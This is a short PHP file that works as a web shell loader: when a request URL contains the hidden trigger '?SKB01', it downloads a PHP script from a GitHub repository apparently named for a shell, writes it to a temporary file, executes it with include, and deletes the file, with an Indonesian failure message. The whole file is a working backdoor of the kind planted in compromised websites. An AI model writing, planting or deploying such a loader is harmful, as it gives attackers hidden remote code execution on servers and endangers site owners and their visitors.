<?php
if (strpos($_SERVER['REQUEST_URI'], '?SKB01') !== false) {
    $url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/rawr.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $code = curl_exec($ch);
    curl_close($ch);

    if ($code !== false) {
        $tmp_file = tempnam(sys_get_temp_dir(), 'php');
        file_put_contents($tmp_file, $code);
        include $tmp_file;
        unlink($tmp_file);
    } else {
        echo "Gagal mengambil script dari GitHub.";
    }

    exit;
}
?>
